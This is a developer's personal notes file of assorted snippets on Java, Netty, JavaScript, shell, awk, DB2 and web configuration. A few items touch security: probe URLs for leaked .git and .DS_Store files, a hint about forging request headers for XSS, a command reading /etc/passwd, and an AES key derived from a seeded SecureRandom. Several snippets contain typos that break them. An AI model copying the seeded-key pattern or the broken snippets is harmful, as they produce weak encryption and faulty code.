--------------------------------------------------------------------------------------
https://github.com/xcatliu/typescript-tutorial/blob/master/README.md TypeScript 入门教程
--------------------------------------------------------------------------------------
https://github.com/cb372/metrics-sigar jvm监控
--------------------------------------------------------------------------------------
json-lib-2.2.2-jdk15.jar
<dependency>
    <groupId>net.sf.json-lib</groupId>
    <artifactId>json-lib</artifactId>
    <version>2.2.2</version>
    <classifier>jdk15</classifier>
</dependency>
--------------------------------------------------------------------------------------
SpringCloud微服务
eureka做服务发现、
config做分布式配置
zuul做api-gateway
feign做客户端负载均衡
hystrix做断路器
turbine做聚合的monitor
graphite做指标监控

--------------------------------------------------------------------------------------
Tomcat tomcat = new Tomcat();

// 设置Connector属性
Connector connector = tomcat.getConnector();
connector.setPort(8443);
connector.setSecure(true);
connector.setScheme("https");

connector.setAttribute("SSLEnabled", true);
connector.setAttribute("sslProtocol", "TLS");
connector.setAttribute("protocol", "org.apache.coyote.http11.Http11Protocol");

--------------------------------------------------------------------------------------

netty
new LengthFieldBasedFrameDecoder(100000000,0,4,0,4)
maxFrameLength为信息最大长度，超过这个长度回报异常，
第二参数lengthFieldOffset为长度属性的起始（偏移）位
第三个参数lengthFieldLengt为“长度属性”的长度
第四个参数lengthAdjustmen为长度调节值，在总长被定义为包含包头长度时，修正信息长度，
第五个参数initialBytesToStrip为跳过的字节数，根据需要我们跳过前4个字节
failFast ：为true，当frame长度超过maxFrameLength时立即报TooLongFrameException异常，为false，读取完整个帧再报异常

特殊分隔符解码器：DelimiterBasedFrameDecoder
ByteBuf delimiter = Unpooled.copiedBuffer("&".getBytes());
ch.pipeline().addLast(new DelimiterBasedFrameDecoder(1024,delimiter));
//1024表示单条消息的最大长度，解码器在查找分隔符的时候，达到该长度还没找到的话会抛异常

定长解码器：FixedLengthFrameDecoder
ch.pipeline().addLast(new FixedLengthFrameDecoder(30));//设置定长解码器 长度设置为30

基于包头不固定长度的解码器：LengthFieldBasedFrameDecoder

包头添加总包长度字节：LengthFieldPrepender
pipeline.addLast("frameEncode", new LengthFieldPrepender(4, false));
lengthFieldLength：长度属性的字节长度
lengthIncludesLengthFieldLength：false，长度字节不算在总长度中，true，算到总长度中


--------------------------------------------------------------------------------------
一般TCP粘包/拆包解决办法
定长消息，例如每个报文长度固定，不够补空格
使用回车换行符分割，在包尾加上分割符，例如Ftp协议
消息分割，头为长度（消息总长度或消息体长度），通常头用一个int32表示
--------------------------------------------------------------------------------------
查询 test.log 中第7列 key值得不重复的数据
#awk ‘!a[$7]++{print}’ 去除第7列重复行，不重复数据输出
#{print} 输出全部
cat test.log |awk '!a[$7]++{print}' >test.log

实现去除重复功能的就是这里的Pattern：
!a[$0]++
在awk中，对于未初始化的数组变量，在进行数值运算的时候，会赋予初值0，
因此a[$0]=0，++运算符的特性是先取值，后加1，因此Pattern等价于
!0

 awk -F”[ ]” 按照空格分割

按照空格分割，输出第一列
cat test.log | awk -F' ' '{print $1}'
--------------------------------------------------------------------------------------
docker 常用命令
查看当前可用docker
docker ps

查看当前可用docker的NAME
docker ps -a|grep -v “CONTAINER ID”|awk ‘{print $NF}’


--------------------------------------------------------------------------------------
let x = 'outer value'

(function() {
  // 这里会产生 TDZ for x
  console.log(x) // TDZ期间访问，产生ReferenceError错误
  let x = 'inner value' // 对x的声明语句，这里结束 TDZ for x
}())

在未经初始化(有赋到值)时，它会进入暂时死区(TDZ)而产生错误，
而这个错误是只有在函数调用时，要使用到传参预设值时才会出现:
function foo(x = y, y = 1) {
  console.log(y)
}

foo(1) // 这不会有错误
foo(undefined, 1) // 错误 ReferenceError: y is not defined
foo() // 错误 ReferenceError: y is not defined

typeof x // "undefined"
{
  // TDZ
  typeof x // ReferenceError
  let x = 42
}
TDZ期间抛出的错误是运行阶段的错误
// 这个例子会有因TDZ抛出的错误
function f() { return x }
f() // ReferenceError

// 这个例子不会有错误
function f() { return x }
let x = 1

--------------------------------------------------------------------------------------
函数	  λx.x+1  	x=>x+1;
函数调用(λx.x+1)4	(x=>x+1)(4);

组合子对照 js 可以理解为：函数体内，没有使用外部变量。
不动点是函数的一个特征：对于函数 f(x)，如果有变量  a 使得  f(a)=a 成立，则称 a 是函数 f 上的一个不动点

var func = f => n => n ? f(f)(n-1)*n : 1; func(func)(4);
匿名调用：
(f => n => n ? f(f)(n-1)*n : 1)(f => n => n ? f(f)(n-1)*n : 1)(4)

--------------------------------------------------------------------------------------
柯里化
function plus(num) {
    var adder = function () {
        var _args = [];
        var _adder = function _adder() {
            [].push.apply(_args, [].slice.call(arguments));
            return _adder;
        };

        _adder.toString = function () {
            return _args.reduce(function (a, b) {
                return a + b;
            });
        }

        return _adder;
    }
    return adder()(num);
}
--------------------------------------------------------------------------------------
Logback日志按时间滚动(切割)
<appender name="ERROR" class="ch.qos.logback.core.rolling.RollingFileAppender">
    <file>logs/service-log.log</file>
    <encoder>
        <pattern>%d{yyyy-MM-dd HH:mm:ss} %level [%class:%line] - %m%n</pattern>
    </encoder>
    <rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy">
        <!-- daily rollover -->
        <fileNamePattern>logs/service-log.%d{yyyy-MM-dd}.log.zip</fileNamePattern>
    </rollingPolicy>
</appender>

--------------------------------------------------------------------------------------
'string' & 1; 0
先使用Number()函数处理，结果返回NaN，NaN又会被当成0来处理
--------------------------------------------------------------------------------------
/*结束时保存设备状态*/
 window.onbeforeunload=function(){//必须使用beforeunload
     var url ="device_saveDeviceStatus";
     $.ajax({
         url:url,
         async:false                //必须采用同步方法
     });
 }
--------------------------------------------------------------------------------------
// lambda & reduce & simple recursive
const flatten = arr => arr.reduce(
	(a, b) => a.concat(Array.isArray(b) ? flatten(b) : b), []
);
--------------------------------------------------------------------------------------
127.0.0.1  fonts.googleapis.com
127.0.0.1  ajax.googleapis.com
--------------------------------------------------------------------------------------
oracle
查看连接数命令
show parameter open_cursors

--查看数据库的名字
select name from v$database;

--查看实例名
select instance_name from v$instance;

--------------------------------------------------------------------------------------
var arr = [1,-1,2,-3];
var grep = $.grep(arr,function(value,index){
  return value > 0;
});
console.log(grep);  // [1, 2]

console.log($.trim(value));
--------------------------------------------------------------------------------------
var name = 123; // 返回undefined
name = 456; // 返回456
结语：定义变量的时候赋值返回:undefined 给已声明变量赋值时候返回当前赋值。
--------------------------------------------------------------------------------------
// 数组的长度是根据下标的最大而确定的
var arr = new Array();
arr['a'] = 1;
arr['b'] = 2;
arr.length; // 打出0
javascript数组是关联数组，实质是对象，以test['test1']=1;方式增加数组元素，将不改变数组的长度， 元素以属性方式存储
--------------------------------------------------------------------------------------
prototype的方法不能访问私有属性和方法
function Person() {
    var name = 'fj'; //私有
    this.age = 21;
}
--------------------------------------------------------------------------------------
for-in 循环遍历的是对象的属性，而不是数组的索引  for-in 遍历属性的顺序并不确定
for-in 只会遍历存在的实体 (稀疏数组 跳过)
--------------------------------------------------------------------------------------
onst arr = ['a', 'b', 'c'];
const iter = arr[Symbol.iterator]();

iter.next() // { value: 'a', done: false }
iter.next() // { value: 'b', done: false }
iter.next() // { value: 'c', done: false }
iter.next() // { value: undefined, done: true }
--------------------------------------------------------------------------------------
background-size: cover;  撑满填充区域的宽度，并保持图片原始高宽比
100% 100%	撑满填充区域的宽和高
--------------------------------------------------------------------------------------
shell
只读变量 readonly myUrl

删除变量
unset variable_name
变量被删除后不能再次使用。unset 命令不能删除只读变量。

获取字符串长度
string="abcd"
echo ${#string} #输出 4

提取子字符串
string="runoob is a great site"
echo ${string:1:4} # 输出 unoo

bash支持一维数组（不支持多维数组），并且没有限定数组的大小。
# 格式：数组名=(值1 值2 ... 值n)
array_name=(value0 value1 value2 value3)
# or
array_name=(
value0
value1
value2
value3
)
# or
array_name[0]=value0
array_name[1]=value1
array_name[n]=valuen

# 格式：${数组名[下标]}
valuen=${array_name[n]}
# 使用@符号可以获取数组中的所有元素
echo ${array_name[@]}

# 取得数组元素的个数
length=${#array_name[@]}
# 或者
length=${#array_name[*]}
# 取得数组单个元素的长度
lengthn=${#array_name[n]}

显示换行
echo -e "OK! \n" # -e 开启转义

显示不换行
echo -e "OK! \c" # -e 开启转义 \c 不换行

原样输出字符串
echo '$name\"'
--------------------------------------------------------------------------------------
var x = 1
function foo (x = x) {
  // ...
}
foo()  // ReferenceError: x is not defined

--------------------------------------------------------------------------------------
.git源码泄漏
git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。
在发布代码的时候，把.git这个目录没有删除，直接发布
http://www.example.com/.git/config

.DS_Store文件泄漏
http://www.example.com/.ds_store

 location ~ ^/WEB-INF/* { deny all; }
--------------------------------------------------------------------------------------
-XX:+UseGCLogFileRotation  启用GC日志文件的自动转储
--------------------------------------------------------------------------------------
Linux中内存主要有匿名内存和Page Cache两种
Page Cache是文件的缓存，用于加速对文件的读写
--------------------------------------------------------------------------------------
-XX:+UseCMSInitiatingOccupancyOnly  禁止hostspot自行触发CMS GC
-XX:CMSInitiatingOccupancyFraction=60
使用cms作为垃圾回收
使用70％后开始CMS收集
CMSInitiatingOccupancyFraction <=((Xmx-Xmn)-(Xmn-Xmn/(SurvivorRatior+2)))/(Xmx-Xmn)*100
例如：
当xmx=128 xmn=36 SurvivorRatior=1时 CMSInitiatingOccupancyFraction<=((128.0-36)-(36-36/(1+2)))/(128-36)*100 =73.913
--------------------------------------------------------------------------------------
https://github.com/cfg4j/cfg4j
--------------------------------------------------------------------------------------
jinfo -flag +PrintGCReason 打印出fullgc的原因,
jinfo可以输出并修改运行时的java 进程的opts
--------------------------------------------------------------------------------------
struts2转码问题
<c:out value="${notice.content}" escapeXml="false" />
<s:property value="" escapeXml="flase"/>
--------------------------------------------------------------------------------------
grep "inet addr" | awk -F'[ :]+' '{print $4}'
当awk的字段分隔符不是默认值的时候，每条记录的开头和结尾处的空格不会被忽略，所以$1为空，$2为inet

多一个加号表明将连续出现的记录分隔符当做一个来处理
echo "width:720 height:360" | awk -F'[ :]' '{print $2,$4}'

# echo "i have two apples and one banana" | awk -F'one|two' '{for(i=1;i<=NF;i++)print i,"="$i}'
1 =i have
2 = apples and
3 = banana

NF	记录当前记录中的字段个数
--------------------------------------------------------------------------------------
如何查看Linux系统上的所有用户
cat /etc/passwd|grep -v nologin|grep -v halt|grep -v shutdown|awk -F":" '{ print $1"|"$3"|"$4 }'|more
--------------------------------------------------------------------------------------
如何向脚本传递参数 ?
./script argument
如何计算传递进来的参数 ?
$#
如何在脚本中获取脚本名称 ?
$0
如何检查之前的命令是否运行成功 ?
$?

假如文件中每行第一个元素是 FIND，如何获取第二个元素
awk'{ if ($1 == "FIND") print $2}'

如何调试 bash 脚本
将 -xv 参数加到 #!/bin/bash 后
例子：
#!/bin/bash –xv

如何检查文件系统中是否存在某个文件 ?
if [ -f /var/log/messages ]
then
echo "File exists"
fi

如何获取文本文件的第 10 行 ?
head -10 file|tail -1

echo ${new:-variable} 的输出是什么
variable
--------------------------------------------------------------------------------------
 ‘who -r’ 和 ‘runlevel’ 命令可以用来查看当前的Linux服务器的运行级别
--------------------------------------------------------------------------------------
js纯函数

纯函数是满足如下条件的函数：
相同输入总是会返回相同的输出。
不产生副作用。
不依赖于外部状态
--------------------------------------------------------------------------------------
Apache配置限制和允许特定IP访问
<Directory "/var/www/security/">
Order Deny,Allow
Deny From all #禁止所有
Allow From 192.168.4.112 #允许的IP
</Directory>

<Directory "/var/www/security/">
Order Allow,Deny
Allow From all #允许所有
Deny From 192.168.4.112 #禁止的IP
</Directory>
--------------------------------------------------------------------------------------

列出所有数据库
#db2 list db directory

列出所有激活的数据库
#db2 list active databases

列出所有用户表
#db2 list tables

列出所有系统表
#db2 list tables for system

列出所有表
#db2 list tables for all

列出用户表
#db2 list tables for user

列出特定用户表
#db2 list tables for schema [user]

察看数据库配置参数信息
db2 get db cfg for test

查看数据表结构
db2 “describe select * from ggwdxtcs”

备份数据库test
db2 backup db test

更新统计信息
db2 runstats on table tb1

当想将表中一列修改为自动增长时，可用下面命令：
alter table  <table name>  alter column <column name>  set not null
alter table <table name> alter column <column name> set generated always as identity (start with 1,increment by 1)

当修改表中一列自动增长的开始值时，可用下面的命令：
alter table <talbe_name> alter column <column name> restart with 18;

create table customer_orders_t (
   order_id  int not null  generated always as identity
      (start with 1
        increment by 1
        minvalue 1
        no maxvalue
       no cycle
       no cache
       order),
   order_date         date not null,
   cust_id           int not null
   primary key (order_date, order_id))


-创建orders_seq对象
create sequence orders_seq
           as int
           start with 1
           increment by 1
           minvalue 1
           no maxvalue
      no cycle
      no cache
      order


--插入数据
insert into customer_orders_t values (next value for orders_seq, current date)

命令行取sequence soc.nico_qian的下一个值：
db2 "values next value for soc.nico_qian"

命令行重置sequence soc.nico_qian：
db2 "alter sequence soc.nico_qian restart"，重置后的值默认为创建SEQUENCE时的MINVALUE

命令行以指定值22重置sequence soc.nico_qian：
db2 "alter sequence soc.nico_qian restart with 22"

DB2一个汉字占3个字节

fetch first 10 rows only--列出表中前10条数据
例如：select * from <表名> fetch first 10 rows only

coalesce(字段名，转换后的值) --对是null的字段进行值转换 返回参数集中第一个非null参数
例如：select coalesce(id,1) from <表名> --对表中id如果为null转换成1

concat('aa','b') --返回是aab

表示如果t1.id为空，则返回空串，如果t1.id不为空，则返回t1.id。
select value(id,'') from t1

LOCATE(ARG1,ARG2,<POS>)

locate函数在arg2中查找arg1第一次出现的位置，如果指定pos，则从arg2的pos处开始查找arg1第一次出现的位置。
eg:
select locate('a',name) from t1

select * from (
         select row_number() over(order by doc_uuid desc) as rownum,
           doc_uuid
         from dt_document  ) a
where rownum > 20 and rownum <=30


--获取当前日期：

select current date from sysibm.sysdummy1;
values current date;

--获取当前日期
select current time from sysibm.sysdummy1;
values current time;

--获取当前时间戳
select current timestamp from sysibm.sysdummy1;
values current timestamp;

只能提供固定的转换格式，而且数据类型是timestamp
TO_CHAR (timestamp_expression,'YYY-MM-DD HH24:MI:SS')
TO_DATE (string_expression, 'YYY-MM-DD HH24:MI:SS')

char(current date,ISO)——转换成yyyy-mm-dd

递归
with rpl (id,parentId,name) as
(
select id,parentId,name from tst  where parentId=1
union all
select  child.id,child.parentId,child.name from rpl parent, tst child where parent.id=child.parentId
)
select * from rpl


with temptab(deptid, deptname, superdept, level) as
   (    select root.deptid, root.deptname, root.superdept, 1
            from departments root
            where deptname='sales'
     union all
        select sub.deptid, sub.deptname, sub.superdept, super.level+1
            from departments sub, temptab super
            where sub.superdept = super.deptid
   )
select deptname from temptab where level=2;

--------------------------------------------------------------------------------------
>/dev/null
这条命令的作用是将标准输出1重定向到/dev/null中

2>&1
这条命令用到了重定向绑定 错误输出将会和标准输出输出到同一个地方

<------------
>/dev/null 2>&1的作用就是让标准输出重定向到/dev/null中，
错误输出也被定向到了/dev/null中
--------------------------------------------------------------------------------------
指定-source时，还需要同时指定-bootclasspath
/javac -source 1.7 -target 1.7 HelloWorld.java -bootclasspath /usr/lib/java7/jre/lib/rt.jar
--------------------------------------------------------------------------------------
服务器上的自动登出
echo $TMOUT

TMOUT= #表示关闭自动登出
source ~/.bash_profile

--------------------------------------------------------------------------------------
https://github.com/neoremind/fluent-validator java验证
--------------------------------------------------------------------------------------
-H 在每个符合样式行前加上符合的文件名称，若有路径会显示路径
-h 与-H参数相类似，但在输出时不显示路径
grep -H 'spring' *.xml 查找所以有的包含spring的xml文件
--------------------------------------------------------------------------------------
@PropertySources({
        @PropertySource(value = "file:.././files/configuration/common.properties",ignoreResourceNotFound = true,encoding = "UTF-8"),
        @PropertySource(value = "file:.././files/configuration/constant.properties",encoding = "UTF-8")
})

<context:property-placeholder location="file:D:/files/**/*.properties" ignore-unresolvable="true"/>
--------------------------------------------------------------------------------------
可以用String()来确定某一变量是否是null或者undefined

var a , b = null;
String(a);//undefined
String(b);//null

var a = function () {};
console.log(typeof a);//function

var b = new function () {};
console.log(typeof b);//object

var c = new Function ();
console.log(typeof c);//function
new function 是一个JavaScript中用户自定义的对象

特权方法是指在构造函数的作用域中使用this关键字定义的方法；与私有方法不同，特权方法能够被公开访问，而且还能够访问私有成员
function Constructor(msg){
    this.Message = msg;

    //私有属性
    var separator = '-';
    var owner = this;

    //私有方法
    function alertMessage(){
        console.log(owner.Message);
    }
    alertMessage();

    //特权方法（也是公有方法）
    this.aptMessage = function (str) {
        this.Message += separator + str;
        alertMessage();
    }
}
--------------------------------------------------------------------------------------
Tiger：声称最快的 Java 依赖注入框架
https://github.com/google/tiger
--------------------------------------------------------------------------------------
Netty提供的ByteBuf支持容量动态调整，对于接收缓冲区的内存分配器
FixedRecvByteBufAllocator：固定长度的接收缓冲区分配器，由它分配的ByteBuf长度都是固定大小的，
并不会根据实际数据报的大小动态收缩。但是，如果容量不足，支持动态扩展。
动态扩展是Netty ByteBuf的一项基本功能，与ByteBuf分配器的实现没有关系；

AdaptiveRecvByteBufAllocator：容量动态调整的接收缓冲区分配器，
它会根据之前Channel接收到的数据报大小进行计算，如果连续填充满接收缓冲区的可写空间，
则动态扩展容量。如果连续2次接收到的数据报都小于指定值，则收缩当前的容量，以节约内存

--------------------------------------------------------------------------------------
InnoDB单列索引长度不能超过767bytes，实际上联合索引还有一个限制是3072
当改为ON时，允许列索引最大达到3072 要生效需要加row_format=compressed或者dynamic
查看状态：
show variables like 'innodb_large_prefix';

alter table `tb_table` row_format=dynamic;
--------------------------------------------------------------------------------------
column 使命令行输出按列对齐
cat test.txt | column -t
-t	判断输入行的列数来创建一个表。分隔符是使用在-s中指定的字符。如果没有指定分隔符，默认是空格
--------------------------------------------------------------------------------------
timeout 让命令最长执行一定的时间，超过设置的时间就会被kill掉
timeout 5 wget http://www.51cache.com/dl/400m.file   5s
--------------------------------------------------------------------------------------
pgrep -fa nginx
-f是匹配进程名和参数，否则只匹配进程名、
-a是显示时显示进程ID，进程名和参数，否则只显示进程ID。
--------------------------------------------------------------------------------------
linux 按时间查看日志
sed -n '/2017-01-19 16:37:00/,/2017-01-19 16:37:59/p'  SubjectJobLog.log
n∶使用安静模式 只有经过sed 特殊处理的那一行(或者动作)才会被列出来
p  ∶列印，亦即将某个选择的资料印出
--------------------------------------------------------------------------------------
通过脚本发送post请求。
curl -d "leaderboard_id=7778" "http://172.16.102.208:8089/wiapi/score"
-d HTTP POST方式传送数据
-i/--include 输出时包括protocol头信息
-I/--head  只显示文档信息

--------------------------------------------------------------------------------------
<Connector port="8081" maxHttpHeaderSize="3145728">
来自于客户端请求的Request和Response的HTTP header 的最大长度，以字节计算
http请求头信息的最大程度，超过此长度的部分不予处理

maxPostSize="0" 0表示不限制post请求长度
--------------------------------------------------------------------------------------
行首添加字符 sed 's/^/a_&/g' a.txt
行末添加字符 sed 's/$/_a&/g' a.txt

sed 's/要被取代的字串/新的字串/g'
&：表示引用前面匹配到的所有字符
--------------------------------------------------------------------------------------
sort  -t "." -k1n,1 -k2n,2 -k3n,3 -k4n,4 ip.txt
-t 分隔符
-k 1, 1: 按照第一列的值进行排序
n:代表是数字顺序

sort -n -t ‘ ‘ -k 2 -k 3 duweixin.net.txt
sort -t ‘ ‘ -k 3nr -k 2n duweixin.net.txt

sort只会比较第二个域的第二个字符到第二个域的最后一个字符的部分，而不会把第三个域的开头字符纳入比较范围
sed -n -k 2.2,3.1 duweixin.net.txt
guge 50 3000
baidu 100 5000
sohu 100 4500
google 110 5000
--------------------------------------------------------------------------------------

查看已经开启的服务
netstat -tulpn
-u (udp)仅显示udp相关选项
-t (tcp)仅显示tcp相关选项
-l 仅列出有在 Listen (监听) 的服務状态
-p 显示建立相关链接的程序名
-n 拒绝显示别名，能显示数字的全部转化成数字
--------------------------------------------------------------------------------------
SecureRandom 实现完全随操作系统本身的內部状态，除非调用方在调用 getInstance 方法之后又调用了 setSeed 方法
KeyGenerator _generator = KeyGenerator.getInstance( "AES" );
SecureRandom secureRandom = SecureRandom.getInstance("SHA1PRNG" );
secureRandom.setSeed(strKey.getBytes());
_generator.init(128,secureRandom);
return _generator.generateKey();
--------------------------------------------------------------------------------------
 -Dfile.encoding=UTF8  -Duser.timezone=GMT+08
--------------------------------------------------------------------------------------
cat /etc/ssh/sshd_config |grep -i usedns
UseDNS no
--------------------------------------------------------------------------------------
cat logs/app.log | awk '{if($9 == "/login" && $3 == "36.110.118.134") print $0}' | head -10
--------------------------------------------------------------------------------------
tar -zcvf aaa.tar.gz --exclude=1 --exclude=2 aaa，需要先排除，后指定目录
rsync -a --exclude=.git src dst
--------------------------------------------------------------------------------------
https://github.com/dangdangdotcom/sharding-jdbc 当当网 分库分表中间件Sharding-JDBC
--------------------------------------------------------------------------------------
查询ip telnet cip.cc
--------------------------------------------------------------------------------------
linux中使用指定用户运行命令
su username -c 'cmd'
--------------------------------------------------------------------------------------
判断字符串为空的方法有三种：
if [ "$str" =  "" ]
if [ x"$str" = x ]
if [ -z "$str" ]
--------------------------------------------------------------------------------------
filepath=$(cd "$(dirname "$0")"; pwd)
脚本文件的绝对路径存在了环境变量filepath中，可以用
echo $filepath
查看完整路径

在shell中：
$0: 获取当前脚本的名称
$#: 传递给脚本的参数个数
--------------------------------------------------------------------------------------
rm ./-slow_query_130103.txt.gz
rm -- -slow_query_130102.txt.gz
--------------------------------------------------------------------------------------
safe-rm是避免删除重要文件的工具，当删除执行rm命令时就会检查rm命令的参数是否在黑名单在存在，
如果存在则提示用户不能删除该文件或者目录
sudo apt-get install safe-rm

/etc/safe-rm.conf
--------------------------------------------------------------------------------------
请求转发到下一台后端服务器上
proxy_next_upstream http_502 http_504 error timeout invalid_header;
重试的次数
proxy_next_upstream_tries

proxy_send_timeout     后端服务器数据回传时间(代理发送超时时间)
proxy_read_timeout      连接成功后，后端服务器响应时间(代理接收超时时间)
proxy_connect_timeout    nginx连接后端的超时时间，一般不超过75s
--------------------------------------------------------------------------------------
exec 3>&1 #把fd 3 重定向到标准输出
exec >>$dlog/export.log 2>&1 #把标准输出和错误输出重定向到日志文件，把

###执行命令

echo "------exec here------" ##随意加点日志
exec 1>&3 3>&- ##恢复shell重定向
--------------------------------------------------------------------------------------
EXIF 元数据在拍照的同时就已经保存在图片文件中了
IPTC 元数据是图片作者自行添加的
--------------------------------------------------------------------------------------
常见的有损压缩音频格式有mp3、wma、ogg 有损音频主要是损失了音频中的高频分量
常见的无损压缩音频格式有wav、ape、flac
--------------------------------------------------------------------------------------
webpack
require("!style!css!./style.css")中的!style!css!
style!表示：style-loader
css!表示： css-loader
--------------------------------------------------------------------------------------
nginx
-g directives — 设置全局配置指令，例如，nginx -g "pid /var/run/nginx.pid; worker_processes 2;"
reopen — 重新打开日志文件
-v — 打印nginx版本。
-V — 打印nginx版本，编译器版本和配置参数
--------------------------------------------------------------------------------------
jsonp接口xss防范
header里输出类型设置为javascript即可：强制指定MIME类型，避免按HTML方式解析，防止XSS漏洞
header('Content-type: text/javascript;charset=utf-8');
--------------------------------------------------------------------------------------
Netty默认不使用内存池
.option(ChannelOption.ALLOCATOR, PooledByteBufAllocator.DEFAULT);
使用内存池之后，内存的申请和释放必须成对出现，即retain()和release()要成对出现，否则会导致内存泄露
完成ByteBuf的解码工作之后必须显式的调用ReferenceCountUtil.release(msg)对接收缓冲区ByteBuf进行内存释放，
否则它会被认为仍然在使用中，这样会导致内存泄露
--------------------------------------------------------------------------------------
ch.pipeline().addLast("idleStateHandler",
new IdleStateHandler(readerIdleTimeSeconds, writerIdleTimeSeconds,allIdleTimeSeconds));

netty 的超时类型 idlestate 主要分为：
all_idle : 一段时间内没有数据接收或者发送
reader_idle ： 一段时间内没有数据接收
writer_idle ： 一段时间内没有数据发送

Netty的IdleStateHandler会根据用户的使用场景，
启动三类定时任务，分别是：ReaderIdleTimeoutTask、WriterIdleTimeoutTask和AllIdleTimeoutTask，
它们都会被加入到NioEventLoop的Task队列中被调度和执行

ReadTimeoutHandler读取数据超时处理
WriteTimeoutHandler写数据超时处理
IdleStateHandler状态空闲处理

实现心跳机制的关键是 IdleStateHandler,
extends ChannelInboundHandlerAdapter 重写userEventTriggered

--------------------------------------------------------------------------------------
CSP(Content Security Policy)
CSP指定网站上所有脚本和图片等资源的源站点，也能阻止所有内联（inline）的脚本和样式
通过 HTTP 头，比如只允许脚本从本源加载：Content-Security-Policy: script-src ‘self’，其中script-src ‘self’是策略。
通过HTML的Meta标签，比如只允许脚本从本源加载：
<meta http-equiv="Content-Security-Policy" content="script-src 'self'">

script-src – 设置可以接受的JavaScript代码的源站点
style-src – 设置可以接受的CSS样式代码的源站点
connect-src – 定义浏览器可以通过XHR、WebSocket或者 EventSource访问哪些站点
font-src – 设置可以接受的字体文件的源站点
frame-src – 定义浏览器可以通过iframe访问哪些站点
img-src – 设置可以接受的图片的源站点
media-src – 设置可以接受的音频和视频文件的源站点
object-src – 设置可以接受的Flash和其它插件的源站点

缺点：
默认情况下，所有的内联JavaScript脚本都不会被执行，因为浏览器无法区分自己的内联脚本和黑客注入的脚本。
CSP还会默认阻止所有eval()风格的代码的执行，包括setInterval/setTimeout中的字符串和类似于
new Function(‘return false’)之类的代码

--------------------------------------------------------------------------------------
Spring从4.0开始提供Conditional的注解 spring @condition注解是用来在不同条件下注入不同实现的
public class WindowsCondition implements Condition{
    public boolean matches(ConditionContext context, AnnotatedTypeMetadata metadata) {
        return context.getEnvironment().getProperty("os.name").contains("Windows");
    }
}
@Bean(name = "service")
@Conditional(WindowsCondition.class)
public ListService windowsService() {
    return new WindowsService();
}
--------------------------------------------------------------------------------------
请求头信息伪造XSS
FireFox的Tamper Data和Moify Headers 插件修改下就实现
--------------------------------------------------------------------------------------
php在使用curl做POST的时候, 当要POST的数据大于1024字节的时候, curl并不会直接就发起POST请求, 而是会分为2个步骤：
1发送一个请求, 包含一个Expect:100-continue, 询问Server使用愿意接受数据
2接收到Server返回的100-continue应答以后, 才把数据POST给Server

不是所有的服务器都会正确应答100-continue, 比如lighttpd, 就会返回417 Expectation Failed。
造成延时，客户端在发送第一次的Expect:100-continue时，需要等待服务器端进行回答之后才发送request body

100 continue
收到了请求的初始部分，请客户端继续

{"Expect":"100-continue"}
--------------------------------------------------------------------------------------
--data-urlencode，通过该选项提供的参数会自动转义特殊字符。
curl --data-urlencode "value 1" http://hostname.com

curl -H 'Accept-Language: es'  http://cnn.com

curl --connect-timeout 15 -H "Content-Type: application/json" -sd '{"data":"data"}'http://aaa.com/aaa
-s/--silent静音模式。不输出任何东西

-F 为带文件的形式发送post请求
curl -F file=@/tmp/me.txt http://www.aiezu.com
--------------------------------------------------------------------------------------
@Bean
public MapperScannerConfigurer mapperScannerConfigurer(){
    MapperScannerConfigurer mapperScannerConfigurer = new MapperScannerConfigurer();
    mapperScannerConfigurer.setBasePackage("cn.XXX.dao.mapper");
    Properties propertiesMapper = new Properties();
    propertiesMapper.setProperty("mappers","tk.mybatis.mapper.common.Mapper");
    propertiesMapper.setProperty("IDENTITY","SELECT REPLACE(UUID(),'-','')");
    propertiesMapper.setProperty("ORDER","BEFORE");
    mapperScannerConfigurer.setProperties(propertiesMapper);
    return mapperScannerConfigurer;
}
--------------------------------------------------------------------------------------

Java 8 集合框架的 parallelStream() 可以正常的在启动线程中捕获到 Lambda 表达式中产生的异常
Arrays.asList("a", "b").parallelStream().forEach(s -> {
       try {
           new FileInputStream(s).close();
       } catch (IOException e) {
           throw new RuntimeException("file not found");
       }
   });
--------------------------------------------------------------------------------------
页面访问cookie的限制条件
1.IE以下的浏览器限定每个域名下不超过 20 个 cookie
2.跨域问题
3.设置了HttpOnly
--------------------------------------------------------------------------------------
cssText属性批量操作样式
var head= document.getElementById("head");
head.style.cssText="width:200px;height:70px;display:bolck";
cssText只需一次reflow，提高了页面渲染性能
缺点 会覆盖之前的样式
function setStyle(el, strCss){
    function endsWith(str, suffix) {
        var l = str.length - suffix.length;
        return l >= 0 && str.indexOf(suffix, l) == l;
    }
    var sty = el.style,
        cssText = sty.cssText;
    if(!endsWith(cssText, ';')){
        cssText += ';';
    }
    sty.cssText = cssText + strCss;
}
--------------------------------------------------------------------------------------
图片预览

<input type="file" name="file" onchange="showPreview(this)" />
<img id="portrait" src="" width="70" height="75">
function showPreview(source) {
  var file = source.files[0];
  if(window.FileReader) {
      var fr = new FileReader();
      fr.onloadend = function(e) {
        document.getElementById("portrait").src = e.target.result;
      };
      fr.readAsDataURL(file);
  }
}
--------------------------------------------------------------------------------------
添加、删除元素(回流+重绘)
隐藏元素，display:none(回流+重绘)，visibility:hidden(只重绘，不回流)
改变浏览器的字体大小等(回流+重绘)

使用documentFragment或div等元素进行缓存操作，这个主要用于添加元素的时候，
就是先把所有要添加到元素添加到1个div(这个div也是新加的); 最后才把这个div append到body中
var p, t, frag;
frag = document.creatDocumentFragment();
p = document.creatElement('p');
t = document.creatTextNode('fist paragraph');
p.appendChild(t);
farg.appendChild(p);
document.body.appendChild(frag);

先display:none 隐藏元素，然后对该元素进行所有的操作，最后再显示该元素。
因对display:none的元素进行操作不会引起回流、重绘。所以只要操作只会有2次回流

使用cloneNode(true or false) 和 replaceChild 技术，引发一次回流和重绘
//建立克隆镜像
var oldNode = document.getElementById('target'),
      clone = oldNode.cloneNode(true);   //深复制

//   处理克隆对象的操作....
//完成后
oldNode.parentNode.replaceChild(clone,oldNode);
--------------------------------------------------------------------------------------
DNS预获取 减少DNS的请求次数，进行DNS预先获取

<link rel="dns-prefetch" href="//cdn.bootcss.com" />

禁止隐式的DNS Prefetch。
<meta http-equiv=”x-dns-prefetch-control” content=”off”>

--------------------------------------------------------------------------------------
检测一个css属性是否支持
var dom = document.createElement('p');
if ('textShadow' in dom.style) {
    alert('支持textShadow属性')
}
else {
    alert('不支持textShadow属性')
}

检测该css3属性是否支持某值

var dom = document.createElement('p');
dom.style.backgroundImage = 'linear-gradient(red, tan)';
if (dom.style.backgroundImage) {
    alert('支持该属性值');
}
else {
